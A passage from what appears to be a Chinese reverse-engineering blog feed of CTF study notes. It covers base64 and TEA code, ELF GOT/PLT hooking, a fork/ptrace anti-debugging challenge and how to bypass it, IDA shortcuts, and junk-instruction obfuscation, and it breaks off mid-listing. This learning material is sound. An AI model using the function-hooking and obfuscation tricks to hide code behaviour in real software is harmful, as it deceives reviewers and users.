class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">64</span>;i++)&#123;</span><br><span class="line">alter[base64t[i]]=i;</span><br><span class="line">&#125;</span><br><span class="line">string s;</span><br><span class="line">cin&gt;&gt;s; </span><br><span class="line"><span class="type">int</span> len=s.<span class="built_in">length</span>();</span><br><span class="line"><span class="type">int</span> n=len<span class="number">-4</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i+=<span class="number">4</span>)&#123;</span><br><span class="line"><span class="type">char</span> b1=s[i];</span><br><span class="line"><span class="type">char</span> b2=s[i<span class="number">+1</span>];</span><br><span class="line"><span class="type">char</span> b3=s[i<span class="number">+2</span>];</span><br><span class="line"><span class="type">char</span> b4=s[i<span class="number">+3</span>];</span><br><span class="line"><span class="built_in">change</span>(&amp;b1,&amp;b2,&amp;b3,&amp;b4);</span><br><span class="line">r=r<span class="number">+3</span>;</span><br><span class="line">ans.<span class="built_in">push_back</span>(b1);</span><br><span class="line">ans.<span class="built_in">push_back</span>(b2);</span><br><span class="line">ans.<span class="built_in">push_back</span>(b3);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> e1,e2,e3,e4;</span><br><span class="line">e1=s[len<span class="number">-4</span>];</span><br><span class="line">e2=s[len<span class="number">-3</span>];</span><br><span class="line">e3=s[len<span class="number">-2</span>];</span><br><span class="line">e4=s[len<span class="number">-1</span>];</span><br><span class="line"><span class="built_in">endw</span>(&amp;e1,&amp;e2,&amp;e3,&amp;e4);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;r;i++)cout&lt;&lt;ans[i];</span><br><span class="line"><span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一下为2023.3.12更新</p><h1 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h1><p>明文8字节，密钥16字节，加解密简单</p><p>关键代码：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v0 += ((v1 &lt;&lt; <span class="number">4</span>) + k0) ^ (v1 + sum) ^ ((v1 &gt;&gt; <span class="number">5</span>) + k1); </span><br><span class="line">v1 += ((v0 &lt;&lt; <span class="number">4</span>) + k2) ^ (v0 + sum) ^ ((v0 &gt;&gt; <span class="number">5</span>) + k3);</span><br></pre></td></tr></table></figure><h1 id="XTEA"><a href="#XTEA" class="headerlink" title="XTEA"></a>XTEA</h1><p>link:</p><blockquote><p><a href="https://blog.csdn.net/gsls200808/article/details/48243019">https://blog.csdn.net/gsls200808/article/details/48243019</a></p></blockquote><p>好吧确实我太懒了</p><h1 id="XXTEA"><a href="#XXTEA" class="headerlink" title="XXTEA"></a>XXTEA</h1><p>link同上</p><p>好吧确实我还是太懒了。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> encrypt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ELF文件的部分知识</title>
      <link href="/2023/03/10/2023-03-10-ELF%E6%96%87%E4%BB%B6%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86/"/>
      <url>/2023/03/10/2023-03-10-ELF%E6%96%87%E4%BB%B6%E7%9A%84%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<h1 id="GOT-和-PLT-表的相关知识及其在RE中的考察方式"><a href="#GOT-和-PLT-表的相关知识及其在RE中的考察方式" class="headerlink" title="GOT 和 PLT 表的相关知识及其在RE中的考察方式"></a>GOT 和 PLT 表的相关知识及其在RE中的考察方式</h1><h2 id="什么是GOT表和PLT表"><a href="#什么是GOT表和PLT表" class="headerlink" title="什么是GOT表和PLT表"></a>什么是GOT表和PLT表</h2><p>ELF文件中包括很多的节，比如.data 节、.text节等，GOT表和PLT表也是这其中的节，PLT表即是.plt节，GOT表即是.got节（这里需要注意的一点是，ELF将GOT拆分成两个表“.got”和”.got.plt”,前者用来保存全局变量引用的地址，后者用来保存函数引用的地址）。</p><p><em><strong>got(全局偏移表)</strong></em><br>got表是Linux平台用来解决对全局数据，外部函数引用的表，当在程序中引用外部的数据，函数时，通过got表来实现对相关数据符号的解析。</p><p><em><strong>plt(过程链接表)</strong></em><br>在动态链接过程中， 函数在加载共享库之后，会对got节中的函数地址进行填充，所以，调用的时候利用plt跳转到got表中项指定的地址即可。</p><p>(这两段内容摘自网络)</p><p>简而言之，ELF文件在编译时无法获取到动态链接库的函数地址，因此在运行时就需要这两个节来获取地址，这两个节的功能类似于exe文件格式中的输入表。</p><h2 id="两个表的工作原理"><a href="#两个表的工作原理" class="headerlink" title="两个表的工作原理"></a>两个表的工作原理</h2><p>当调用到动态链接库的函数时（比如printf、scanf），程序会首先跳转到plt表中的相应位置,接下来有两个分支：</p><ol><li>当这个函数是第一次使用时，plt表会调用动态链接器将这个函数的真正地址填入到.got.plt表中。</li><li>当这个函数是第二次使用时，plt表会直接跳转到got表中这个函数的真正地址（因为在第一次使用时这个地址已经被填入到了.got.plt表）。</li></ol><p>本文对这两个表的介绍比较简单，详细内容可以参考《程序员的自我修养》这本书或者下面这个链接：</p><blockquote><p><a href="https://blog.csdn.net/u011987514/article/details/67716639">https://blog.csdn.net/u011987514/article/details/67716639</a></p></blockquote><h2 id="在RE中的考察方式"><a href="#在RE中的考察方式" class="headerlink" title="在RE中的考察方式"></a>在RE中的考察方式</h2><p>主要就是通过GOT劫持，通过修改GOT表中的地址，使得对某一个动态链接库中的函数hook。</p><p>当程序调用到这个函数时，程序会找到这个函数在GOT表中的地址，然后跳转到这个地址。然而这个地址已经改变了，这样程序会跳转到修改之后函数的地址。</p><p>下面一段代码是GOT劫持的部分代码(IDA分析之后的结果)</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">int</span> (**<span class="built_in">sub_795</span>())(<span class="type">const</span> <span class="type">char</span> *s1, <span class="type">const</span> <span class="type">char</span> *s2)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">int</span> (**result)(<span class="type">const</span> <span class="type">char</span> *, <span class="type">const</span> <span class="type">char</span> *); <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = &amp;strcmp;</span><br><span class="line">  qword_201090 = &amp;strcmp;</span><br><span class="line">  off_201028 = sub_6EA;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中的off_201028即为strcmp函数的地址。<br>下面是这个程序的.got.plt节</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">got.plt:0000000000201000</span><br><span class="line">.got.plt:0000000000201000 ; Segment type: Pure data</span><br><span class="line">.got.plt:0000000000201000 ; Segment permissions: Read/Write</span><br><span class="line">.got.plt:0000000000201000 _got_plt        segment qword public &#x27;DATA&#x27; use64</span><br><span class="line">.got.plt:0000000000201000                 assume cs:_got_plt</span><br><span class="line">.got.plt:0000000000201000                 ;org 201000h</span><br><span class="line">.got.plt:0000000000201000                 dq offset stru_200DF8</span><br><span class="line">.got.plt:0000000000201008 qword_201008    dq 0                    ; DATA XREF: sub_590↑r</span><br><span class="line">.got.plt:0000000000201010 qword_201010    dq 0                    ; DATA XREF: sub_590+6↑r</span><br><span class="line">.got.plt:0000000000201018 off_201018      dq offset puts          ; DATA XREF: _puts↑r</span><br><span class="line">.got.plt:0000000000201020 off_201020      dq offset printf        ; DATA XREF: _printf↑r</span><br><span class="line">.got.plt:0000000000201028 off_201028      dq offset strcmp        ; DATA XREF: _strcmp↑r</span><br><span class="line">.got.plt:0000000000201028 _got_plt        ends</span><br><span class="line">.got.plt:0000000000201028</span><br></pre></td></tr></table></figure><p>显然，strcmp会被上面那一段代码hook成sun_6EA。</p><h1 id="Linux-x86系统下main函数执行前的过程"><a href="#Linux-x86系统下main函数执行前的过程" class="headerlink" title="Linux x86系统下main函数执行前的过程"></a>Linux x86系统下main函数执行前的过程</h1><p><img src="/../imgs/202303102056349.png" alt="main"></p><p>本部分只介绍在RE中的应用，想详细了解此部分知识请参考下面这个链接</p><blockquote><p><a href="https://blog.csdn.net/weixin_46222091/article/details/111636282">https://blog.csdn.net/weixin_46222091/article/details/111636282</a></p></blockquote><p>可以看到main函数不是最开始执行的函数，这意味着在main函数之前可能存在某些自定义函数对程序进行某些操作，事实上正式如此。</p><p>我们应该重点关注这几个函数，因为这些函数是可以添加自定义函数的。</p><ol><li>_do_global_ctors_aux</li><li>__libc_csu_init<br>(本部分介绍的是最常见的，可能仍然有其他函数是可以被自定义的，如fini)<br>其中在第一个函数中添加自定义函数是这样的：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __attribute__ ((constructor)) <span class="built_in">a_constructor</span>() &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>在第二个函数中添加自定义函数是这样的：<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv, <span class="type">char</span> **envp)</span> </span>&#123;</span><br><span class="line"> <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, __FUNCTION__);</span><br><span class="line">&#125;</span><br><span class="line">__attribute__((<span class="built_in">section</span>(<span class="string">&quot;.init_array&quot;</span>))) <span class="built_in">typeof</span>(init) *__init = init;</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ELF </tag>
            
            <tag> GOT-PLT </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux下双进程保护问题及应对方案</title>
      <link href="/2023/03/10/2023-03-10-linux%E4%B8%8B%E5%8F%8C%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%E9%97%AE%E9%A2%98%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%96%B9%E6%A1%88/"/>
      <url>/2023/03/10/2023-03-10-linux%E4%B8%8B%E5%8F%8C%E8%BF%9B%E7%A8%8B%E4%BF%9D%E6%8A%A4%E9%97%AE%E9%A2%98%E5%8F%8A%E5%BA%94%E5%AF%B9%E6%96%B9%E6%A1%88/</url>
      
        <content type="html"><![CDATA[<h1 id="什么是双进程保护问题"><a href="#什么是双进程保护问题" class="headerlink" title="什么是双进程保护问题"></a>什么是双进程保护问题</h1><p>本题目来自于NSSCTF平台的题目。</p><p>ID: 1442  [NSSRound#6 Team]void(V2)</p><p>首先，我们应该了解一下Linux下C++的多进程编写。</p><h2 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a><em><strong>fork函数</strong></em></h2><p>本部分以一个实例来讲解一下fork函数产生的双进程。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_CDA</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="type">__pid_t</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = fork();                                  <span class="comment">// 产生双进程</span></span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt; <span class="number">0</span> )                                 <span class="comment">// 产生双进程失败</span></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v2 )                                     <span class="comment">// fork函数的返回值决定了这个进程是父进程还是子进程</span></span><br><span class="line">  &#123;                                             <span class="comment">// 父进程的返回值是子进程的pid，因此一定大于0</span></span><br><span class="line">    result = <span class="built_in">sub_AD7</span>(v2);                      <span class="comment">//父进程执行sub_AD7函数</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span>                                          <span class="comment">// 子进程的fork返回值是0</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="built_in">ptrace</span>(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);<span class="comment">// 请求被调试</span></span><br><span class="line">    <span class="keyword">if</span> ( result == <span class="number">-1</span> )                         <span class="comment">// 如果子进程被其他调试器调试，那么ptrace向父进程请求调试失败，返回-1</span></span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">0</span>; ++i )                    <span class="comment">// 如果ptrace向父进程请求成功，返回值是0</span></span><br><span class="line">    result = ((sub_95A + i + <span class="number">7</span>))(<span class="number">11LL</span>, <span class="number">13LL</span>, <span class="number">17LL</span>);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>所有的关键部分都已经在上面这部分代码写上了注释。</p><h2 id="双进程问题特征"><a href="#双进程问题特征" class="headerlink" title="双进程问题特征"></a><em><strong>双进程问题特征</strong></em></h2><ol><li>父进程被当做一个调试器，父进程可能会对子进程进程改变</li><li>子进程是关键部分，关键代码会在子进程中出现</li><li>使用ptrace用来连接两个进程</li></ol><h2 id="ptrace函数介绍"><a href="#ptrace函数介绍" class="headerlink" title="ptrace函数介绍"></a><em><strong>ptrace函数介绍</strong></em></h2><p><em><strong>ptrace</strong></em>函数是调试器(比如gdb)所使用的函数，这也是为什么说父进程被当做一个调试器的原因。</p><p>子进程中会在开始调用一个ptrace函数：</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">result = <span class="built_in">ptrace</span>(PTRACE_TRACEME, <span class="number">0LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br></pre></td></tr></table></figure><p>这个函数是请求父进程对本进程进行调试，调用成功返回0，失败返回-1。</p><p>这个函数也是一种反调试技术，但是我们可以很容易对其进行nop。</p><p>我们再来看一下父进程调用的函数。</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父进程调用的函数</span></span><br><span class="line"><span class="function"><span class="type">unsigned</span> __int64 __fastcall <span class="title">sub_5622CB200AD7</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> son_pid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> stat_loc; <span class="comment">// [rsp+1Ch] [rbp-F4h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v3; <span class="comment">// [rsp+20h] [rbp-F0h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-E8h]</span></span><br><span class="line">  pt_regs reg; <span class="comment">// [rsp+30h] [rbp-E0h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  <span class="built_in">waitpid</span>(son_pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stat_loc != <span class="number">127</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="built_in">ptrace</span>(PTRACE_SETOPTIONS, son_pid, <span class="number">0LL</span>, <span class="number">0x100000LL</span>);<span class="comment">// 防止子进程进程脱离父进程控制</span></span><br><span class="line">  <span class="keyword">while</span> ( stat_loc == <span class="number">127</span> )                     <span class="comment">// 127表示子进程正在被跟踪</span></span><br><span class="line">                                                <span class="comment">// </span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">ptrace</span>(PTRACE_SYSCALL, son_pid, <span class="number">0LL</span>, <span class="number">0LL</span>);  <span class="comment">// 当子进程执行一个系统调用时，它会被暂停</span></span><br><span class="line">    <span class="built_in">waitpid</span>(son_pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">ptrace</span>(PTRACE_GETREGS, son_pid, <span class="number">0LL</span>, &amp;reg); <span class="comment">// 获取所有寄存器的值，放入V5</span></span><br><span class="line">    <span class="keyword">if</span> ( reg.orig_rax == <span class="number">67890</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg.orig_rax = <span class="number">1LL</span>;</span><br><span class="line">      v3 = reg.rdx;</span><br><span class="line">      reg.rdx = reg.rsi;</span><br><span class="line">      reg.rsi = reg.rdi;</span><br><span class="line">      reg.rdi = v3;</span><br><span class="line">      <span class="built_in">ptrace</span>(PTRACE_SETREGS, son_pid, <span class="number">0LL</span>, &amp;reg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( reg.orig_rax == <span class="number">12345</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      reg.orig_rax = <span class="number">0LL</span>;</span><br><span class="line">      v4 = reg.rdx;</span><br><span class="line">      reg.rdx = reg.rsi;</span><br><span class="line">      reg.rsi = reg.rdi;</span><br><span class="line">      reg.rdi = v4;</span><br><span class="line">      <span class="built_in">ptrace</span>(PTRACE_SETREGS, son_pid, <span class="number">0LL</span>, &amp;reg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">ptrace</span>(PTRACE_SYSCALL, son_pid, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="built_in">waitpid</span>(son_pid, &amp;stat_loc, <span class="number">0</span>);</span><br><span class="line">  &#125;                                             <span class="comment">// while循环块</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v6;             <span class="comment">// 返回0</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中父进程会大量使用prace函数，以此实现对子进程的调试，这一个部分我已经将ptrace函数分别实现的功能做了注释。可以看到，父进程的功能是这样的,在子进程的系统调用函数后下一个断点，然后再这一个断点处获取子进程的寄存器信息，如果寄存器中的orig_rax是12345或者67890，就对子进程的寄存器进行修改。</p><p>然而，orig_rax保存的是系统调号，这个编号不可能出现12345或者67890，因此这个函数对子进程不会进行任何操作。</p><h1 id="应对方案"><a href="#应对方案" class="headerlink" title="应对方案"></a>应对方案</h1><h2 id="修改子进程"><a href="#修改子进程" class="headerlink" title="修改子进程"></a><em><strong>修改子进程</strong></em></h2><p>首先分析父进程的流程，了解清楚父进程对子进程进行了何种修改，之后编写IDApython脚本对子进程进行修改。</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a><em><strong>动态调试</strong></em></h2><p>在动态调试中，我们需要进行以下几个操作。</p><ol><li>nop掉fork函数，让程序只走子进程的部分</li><li>nop掉子进程的ptrace函数或者修改ptrace函数的返回值,使其不要执行退出函数</li><li>在适当位置下断点（比如子进程结束时），查看子进程进行的操作等</li></ol><p>之后的操作就是正常的逆向流程了</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> 双进程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA个人使用报告</title>
      <link href="/2023/03/06/2023-03-06-IDA/"/>
      <url>/2023/03/06/2023-03-06-IDA/</url>
      
        <content type="html"><![CDATA[<h1 id="IDA个人使用报告"><a href="#IDA个人使用报告" class="headerlink" title="IDA个人使用报告"></a>IDA个人使用报告</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>工欲善其事，必先利其器。<br>IDA的强大是毋庸置疑的，但是由于本人在最开始学习IDA时没有关注IDA的强大功能，只是将就能用就行，这导致本人放弃拥入IDA的怀抱，转而投向OD等在动态分析方面更强大的工具。</p><p>然而，OD固然好用，但在大量代码面前必然存在局限性，只有拥抱IDA才能提高自身逆向水平。<br>I<br>DA存在大量的功能快捷键，有些功能能够让使用者在逆向时更加舒服方便。</p><p>在之后的文章中，我在给各种功能快捷键分类时是以本人的使用体验分类的，读者可能会有不同感受体验。</p><h2 id="基本功能，重要性程度最高，使用与不使用差别非常大"><a href="#基本功能，重要性程度最高，使用与不使用差别非常大" class="headerlink" title="基本功能，重要性程度最高，使用与不使用差别非常大"></a>基本功能，重要性程度最高，使用与不使用差别非常大</h2><ol><li>F5：查看伪代码</li><li>shift+f12： 可以打开string窗口，一键找出所有的字符串</li><li>x：对着某个函数、变量按该快捷键，可以查看它的交叉引用</li><li>alt+t :搜索指令，可用来搜索某些关键代码</li><li>IDApython:写python脚本,高阶功能，做某些重复操作会更加方便（比如去除花指令）</li><li>远程调试</li><li>C：表示将当前的数据按照代码形式显示 （去除花指令必备）</li><li>D：表示将当前的数据按照数据的形式显示  （去除花指令必备）</li><li>P： 定义函数（去除花指令必备）</li><li>在函数窗口中用Ctrl+E或在反汇编窗口的函数内部用Alt+P :修改函数参数</li><li>G：跳转到某一地址</li><li>十六进制窗口中使用F2进行数据的修改，修改后再次按下F2即可应用修改（patch）（有些版本的IDA中没有安装keypatcher插件,无法方便的patch，但可以使用上述方法）</li><li>shift+E 快速提取数据</li></ol><h2 id="非常舒服的功能，可用可不用，个人推荐度很高"><a href="#非常舒服的功能，可用可不用，个人推荐度很高" class="headerlink" title="非常舒服的功能，可用可不用，个人推荐度很高"></a>非常舒服的功能，可用可不用，个人推荐度很高</h2><ol><li>空格：流程图 与 线性表之间转换</li><li>Tab：C语言与汇编之间转换</li><li>n：更改变量的名称</li><li>y：更改变量的类型</li><li>&#x2F; ：在反编译后伪代码的界面中写下注释</li><li>\：在反编译后伪代码的界面中隐藏&#x2F;显示变量和函数的类型描述（※本人非常喜欢）</li><li>windows–&gt;reset desktop: 可以恢复初始ida布局</li><li>ctrl+F :筛选函数窗口（※ 本人非常喜欢）</li><li>A：表示将当前的数据用字符串的形式显示</li><li>R: 将数字转化成字符类型</li><li>H：任何类型转化成数字</li><li>“options”-&gt;”General”-&gt;”Numbers of opcode bytes”:显示汇编代码的字节码</li><li>Edit-&gt; patch program: patch!!</li></ol><h2 id="一般的功能，个人推荐度不高，但是读者可能使用起来很舒服"><a href="#一般的功能，个人推荐度不高，但是读者可能使用起来很舒服" class="headerlink" title="一般的功能，个人推荐度不高，但是读者可能使用起来很舒服"></a>一般的功能，个人推荐度不高，但是读者可能使用起来很舒服</h2><ol><li>option–&gt;general-&gt;Line prefixes:在流程视图中添加地址偏移</li><li>option–&gt;general-&gt;Auto comments:自动添加反汇编注释(开启了自动注释的功能后，IDA就可以直接告诉你汇编指令的意思)</li><li>在伪代码中右键之后点击”Collapse declaration”: 隐藏变量的声明区域<br>（前两条不推荐的原因是占用了视图空间，反而影响分析，第三条不推荐的原因是无法看到都声明了哪些变量，但是可以在看完后再使用这一个功能）</li></ol><h2 id="后言"><a href="#后言" class="headerlink" title="后言"></a>后言</h2><p>很多高阶功能需要学习更多的知识，在此没有列出来，作者仍在学习过程中。</p><p>本文的内容一部分来源于以下两个链接：</p><blockquote><p><a href="https://www.cnblogs.com/Max-hhg/articles/14266616.html">https://www.cnblogs.com/Max-hhg/articles/14266616.html</a><br><a href="https://blog.csdn.net/weixin_60363168/article/details/127747274">https://blog.csdn.net/weixin_60363168/article/details/127747274</a></p></blockquote><p>另一部分内容来源于N1BOOK中对IDA的介绍</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>花指令</title>
      <link href="/2023/03/06/2023-03-06-%E8%8A%B1%E6%8C%87%E4%BB%A4/"/>
      <url>/2023/03/06/2023-03-06-%E8%8A%B1%E6%8C%87%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><h2 id="什么是花指令"><a href="#什么是花指令" class="headerlink" title="什么是花指令"></a>什么是花指令</h2><p>花指令就是指在程序中完全冗余，不影响程序功能但对逆向工程产生干扰的指令。</p><p>花指令没有固定格式，泛指用于干扰逆向工作的无用指令。</p><h2 id="花指令常见类型"><a href="#花指令常见类型" class="headerlink" title="花指令常见类型"></a>花指令常见类型</h2><ul><li>相互抵消的操作指令</li></ul><p>一个常见的函数头是这样的：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">mov ebp esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><p>插入一些相互抵消的操作，使得上段代码成这样：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">push ebp</span><br><span class="line">pushfd</span><br><span class="line">add esp,0xd</span><br><span class="line">nop</span><br><span class="line">sub esp,0xd</span><br><span class="line">popfd</span><br><span class="line">mov ebp esp</span><br><span class="line">sub esp,0x100</span><br></pre></td></tr></table></figure><ul><li>脏字节</li></ul><p>有特殊的指令，其字节码是这样的：  E8 FF ····<br>其中E8指令为call，  E8 FF的意思是跳转到本指令的第二个字节，也就是说，E8 FF的下一条指令为 FF ····，这种情况下E8这个字节码完全没有作用，但是却扰乱了静态分析，将这个字节码称之为脏字节。</p><p>也会存在很多其他的脏字节，其中大多是E8（call）这个字节。<br>例如这一段代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">    push ebp</span><br><span class="line">    jz addr2</span><br><span class="line">    jnz addr2</span><br><span class="line">    db 0xE8</span><br><span class="line">add3:</span><br><span class="line">    sub esp,0x100</span><br><span class="line">    ···</span><br><span class="line">add2:</span><br><span class="line">    mov ebp,esp</span><br><span class="line">    jmp addr3</span><br></pre></td></tr></table></figure><p>其中 第二行与第三行这一对相反条件的跳转，之后往往会有花指令</p><ul><li>指令替换</li></ul><p>用复杂的指令替换简单的指令，往往涉及到栈指针的改变，导致IDA无法正常分析。<br>这种类型的花指令需要仔细分析每一条指令导致的改变，尤其是栈指针的改变，从而判断出哪一部分是完全无用的部分。</p><p>这一类型的花指令经常涉及到call&#x2F;ret指令的替换，通过改变ESP&#x2F;EBP，来实现上述两个指令的更换。</p><p>这一部分非常推荐的是刚刚过去的VNCTF2023中的confuse_re题目。</p><p>在此只粘贴本题目中的花指令部分。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00000000004045D0</span><br><span class="line">.text:00000000004045D0 var_8           = qword ptr -8</span><br><span class="line">.text:00000000004045D0</span><br><span class="line">.text:00000000004045D0 ; __unwind &#123;</span><br><span class="line">.text:00000000004045D0                 endbr64</span><br><span class="line">.text:00000000004045D4                 push    rbp</span><br><span class="line">.text:00000000004045D5                 mov     rbp, rsp</span><br><span class="line">.text:00000000004045D8                 sub     rsp, 10h</span><br><span class="line">.text:00000000004045DC                 mov     [rbp+var_8], rdi</span><br><span class="line">.text:00000000004045E0                 push    rbp</span><br><span class="line">.text:00000000004045E1                 call    $+5</span><br><span class="line">.text:00000000004045E6</span><br><span class="line">.text:00000000004045E6 loc_4045E6:                             ; DATA XREF: sub_4045D0+17↓o</span><br><span class="line">.text:00000000004045E6                 pop     rbp</span><br><span class="line">.text:00000000004045E7                 add     rbp, (offset loc_4045EE - offset loc_4045E6)</span><br><span class="line">.text:00000000004045EB                 push    rbp</span><br><span class="line">.text:00000000004045EC                 retn</span><br><span class="line">.text:00000000004045EC sub_4045D0      endp ; sp-analysis failed</span><br><span class="line">.text:00000000004045EC</span><br><span class="line">.text:00000000004045EC ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004045ED                 db 0E8h</span><br><span class="line">.text:00000000004045EE ; ---------------------------------------------------------------------------</span><br><span class="line">.text:00000000004045EE</span><br><span class="line">.text:00000000004045EE loc_4045EE:                             ; DATA XREF: sub_4045D0+17↑o</span><br><span class="line">.text:00000000004045EE                 pop     rbp</span><br><span class="line">.text:00000000004045EF                 mov     rax, [rbp-8]</span><br><span class="line">.text:00000000004045F3                 mov     rdi, rax</span><br><span class="line">.text:00000000004045F6                 call    sub_403940</span><br><span class="line">.text:00000000004045FB                 nop</span><br><span class="line">.text:00000000004045FC                 leave</span><br><span class="line">.text:00000000004045FD                 retn</span><br><span class="line">.text:00000000004045FD ; &#125; // starts at 4045D0</span><br><span class="line">.text:00000000004045FE</span><br></pre></td></tr></table></figure><p>这一花指令从0x4045E0开始，一直到0x4045EE，所实现的功能仅仅只是跳转，或者说无任何功能，全部nop即可。</p><h2 id="花指令的手动patch"><a href="#花指令的手动patch" class="headerlink" title="花指令的手动patch"></a>花指令的手动patch</h2><ul><li>首先是必备的IDA基本操作,D、C、P快捷键，以及编辑函数范围操作。</li></ul><p>本部分的例题是NSSCTF平台上的 jump_by_jump。<br>（作者非常幸运能够在学习花指令的时候看到一篇简单详细的题解，此题目中的Tigamm的题解是本部分的资料来源）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.text:00411888                 jz      short near ptr loc_41188C+1</span><br><span class="line">.text:0041188A                 jnz     short near ptr loc_41188C+1</span><br><span class="line">.text:0041188C</span><br><span class="line">.text:0041188C loc_41188C:                             ; CODE XREF: .text:00411888↑j</span><br><span class="line">.text:0041188C                                         ; .text:0041188A↑j</span><br><span class="line">.text:0041188C                 call    near ptr 41BC4932h</span><br><span class="line">.text:00411891                 add     [ecx+0D8BE045h], cl</span><br><span class="line">.text:00411897                 xor     al, 